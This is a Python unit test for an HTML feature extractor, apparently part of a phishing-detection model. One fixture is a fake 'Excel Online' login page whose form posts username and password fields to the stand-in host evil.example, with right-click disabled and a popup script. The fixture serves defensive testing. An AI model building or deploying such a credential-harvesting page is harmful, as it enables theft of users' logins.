import unittest

from app.ml.html_feature_extractor import HTML_MODEL_FEATURE_COLUMNS, extract_html_features_dataframe


class HtmlFeatureExtractorTests(unittest.TestCase):
    def test_extracts_runtime_html_features(self):
        html = """
        <html>
          <head><title>Excel Online</title></head>
          <body oncontextmenu="return false">
            <form action="http://evil.example/collect">
              <input name="usr" placeholder="Someone@example.com" />
              <input name="psw" placeholder="Password" />
            </form>
            <a href="#">Continue</a>
            <script>window.open('/next')</script>
          </body>
        </html>
        """

        frame = extract_html_features_dataframe("https://login.example/doc", html)

        self.assertEqual(list(frame.columns), HTML_MODEL_FEATURE_COLUMNS)
        self.assertEqual(frame.shape[0], 1)
        self.assertGreaterEqual(frame.loc[0, "SensitiveInputCount"], 1)
        self.assertEqual(frame.loc[0, "ExtFormAction"], 1.0)
        self.assertEqual(frame.loc[0, "RightClickDisabled"], 1.0)
        self.assertEqual(frame.loc[0, "PopUpWindow"], 1.0)

    def test_ignores_malformed_links(self):
        html = '<html><body><a href="http://[broken">bad</a></body></html>'

        frame = extract_html_features_dataframe("https://example.com", html)

        self.assertEqual(frame.shape[0], 1)
        self.assertEqual(frame.loc[0, "ExternalLinkCount"], 0.0)


if __name__ == "__main__":
    unittest.main()
